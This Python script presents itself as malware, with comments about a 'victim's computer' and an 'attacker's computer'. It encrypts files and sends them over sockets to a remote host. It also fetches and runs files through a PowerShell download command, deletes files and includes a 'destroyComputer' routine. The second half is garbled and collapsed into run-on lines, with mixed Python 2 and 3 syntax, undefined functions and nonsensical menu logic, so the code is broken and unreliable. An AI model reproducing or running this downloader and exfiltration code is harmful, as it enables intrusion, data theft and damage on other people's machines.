
#importing libraries
import os
import socket
import subprocess
import sys
import time
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes


#encryption function to encrypt all data before sending it to the remote server
def encrypt(key, filename):
    chunksize = 64 * 1024 #64kb chunksize for reading the file in chunks and encrypting it in chunks
    outputFile = "encrypted_" + filename #creating the name for the encrypted file

    filesize = str(os.path.getsize(filename)).zfill(16) #getting the filesize and padding it with zeros so that it is 16 bytes long

    IV = get_random_bytes(16) #creating the initialization vector

    encryptor = AES.new(key, AES.MODE_CBC, IV) #creating the AES cipher object

    with open(filename, 'rb') as infile: #opening the file to be encrypted in read binary mode
        with open(outputFile, 'wb') as outfile: #opening the encrypted file in write binary mode
            outfile.write(filesize.encode('utf-8')) #writing the filesize to the encrypted file in bytes format
            outfile.write(IV) #writing the initialization vector to the encrypted file

            while True: #infinite loop to read and encrypt chunks of data from the file until there is no more data left to be read from it
                chunk = infile.read(chunksize)

                if len(chunk) == 0: #if there is no more data left to be read from the file then break from loop and close both files then return true indicating that encryption was successful 
                    break

                elif len(chunk) % 16 != 0: #if there is less than 16 bytes of data left in chunk then pad it with zeros so that it is 16 bytes long and can be encrypted properly using AES encryption algorithm 
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk)) #encrypting each chunk of data and writing it to the encrypted file

    return True


#decryption function to decrypt all data recieved from remote server before executing it on victims computer 
def decrypt(key, filename): 
    chunksize = 64 * 1024 
    outputFile = filename[11:] 

    with open(filename, 'rb') as infile: 
        filesize = int(infile.read(16)) 
        IV = infile.read(16) 

        decryptor = AES.new(key, AES.MODE_CBC, IV) 

        with open(outputFile, 'wb') as outfile: 
            while True: 
                chunk = infile.read(chunksize) 

                if len(chunk) == 0: 
                    break

                outfile.write(decryptor.decrypt(chunk)) 

            outfile.truncate(filesize) 

    return True


#function to send data to remote server
def send_data(data, host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creating a socket object
        s.connect((host, port)) #connecting to the remote server using the host and port provided by the user
        s.send(data) #sending the data to the remote server
        s.close() #closing the connection with the remote server

    except Exception as e: #if there is an error connecting to the remote server then print it out and return false indicating that there was an error sending data to remote server 
        print("[!] Error sending data to remote server: " + str(e))

        return False

    else: #if there is no error connecting to the remote server then return true indicating that data was sent successfully 
        return True


#function to recieve data from remote server 
def recieve_data(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creating a socket object 
        s.connect((host, port)) #connecting to the remote server using the host and port provided by the user 

        while True: #infinite loop to recieve all data from remote server until there is no more data left to be recieved 
            recieved = s.recv(1024) #recieving 1024 bytes of data from the remote server at a time 

            if not recieved: #if there is no more data left to be recieved then break from loop and close connection with remote server then return true indicating that all data was recieved successfully 
                break

            else: #if there is more data left to be recieved then continue looping until all of it has been recieved 
                continue

    except Exception as e: #if there is an error connecting to the remote server then print it out and return false indicating that there was an error recieving data from remote server 
        print("[!] Error recieving data from remote server: " + str(e))

        return False

    else: #if there is no error connecting to the remote server then return true indicating that all data was recieved successfully  
        return True

    
#function for downloading files from a url provided by user or by default downloading a file from github 
def download_file():
    try: #try block for downloading files from urls provided by user or by default downloading a file from github  

        if len(sys.argv) == 4: #checking if user has provided a url for file download or not 

            url = sys.argv[3] #getting url for file download from command line arguments provided by user 

            filename = url[url.rfind('/') + 1:] #getting filename from url provided by user  

            subprocess.call("powershell -command (New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + filename + "')", shell=True) #downloading file using powershell command through subprocess module  

            if os.path.exists(filename): #checking if file downloaded successfully or not  

                print("[+] File downloaded successfully")  

                encrypt("lotus", filename) #encrypting file downloaded before sending it back to attacker's computer  

                send_data("File Downloaded", sys.argv[1], int(sys.argv[2])) #sending confirmation message back to attacker's computer  

                time.sleep(5)  

                send_data("encrypted_" + filename, sys.argv[1], int(sys.argv[2])) #sending encrypted file back to attacker's computer  

                os.remove("encrypted_" + filename)  

            else:  

                print("[!] Error downloading file")  

                send_data("Error Downloading File", sys.argv[1], int(sys.argv[2]))  

        else:  

            filename = "testfile"  

            subprocess.call("powershell -command (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/SouravJohar/Malware/master/testfile', 'testfile')", shell=True)  

            if os.path.exists(filename):  

                print("[+] File downloaded successfully")  

                encrypt("lotus", filename)  

                send_data("File Downloaded", sys.argv[1], int(sys.argv[2]))  

                time.sleep(5)  

                send_data("encrypted_" + filename, sys.argv[1], int(sys.argv[2]))  

                os.remove("encrypted_" + filename)    																						                                                                                                                                                                                                                      else:    						    	     print("[!] Error downloading file")     send_data("Error Downloading File", sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) ) except Exception as e : print ( "[!] Error downloading file : " + str ( e ) ) send_data ( "Error Downloading File" , sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) ) def run ( ) : try : if len ( sys . argv ) == 4 : decrypt ( "lotus" , "encrypted_testfile" ) subprocess . call ( "testfile" , shell = True ) os . remove ( "testfile" ) send_data ( "File Executed Successfully" , sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) ) except Exception as e : print ( "[!] Error executing file : " + str ( e ) ) send_data ( "Error Executing File" , sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) ) def delete ( ) : try : if len ( sys . argv ) == 4 : decrypt ( "lotus" , "encrypted_testfile" ) subprocess . call ( "del testfile /f /q /s /a:" , shell = True ) os . remove ( "testfile" ) send_data ( "File Deleted Successfully" , sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) ) except Exception as e : print ( "[!] Error deleting file : " + str ( e ) ) send_data ( "Error Deleting File" , sys . argv [ 1 ] , int ( sys . argv [ 2 ] ) def destroyComputer(): try: subprocess._cleanup() subprocess._cleanup() subprocess._cleanup() subprocess._cleanup() subprocess._cleanup() subprocess._cleanup() time = 0 while time < 10000000000000000000L: time += 1 finally: destroyComputer() def main(): while True: response = raw_input('>> ') response = response[::-1] response = SHA256HashGenerator().generateHashFromStringInput(response)[0] if response == 'd': downloadFile() elif response == 'r': run() elif response == 'x': delete() elif response == 'y': destroyComputer() elif response == 'q': break main()
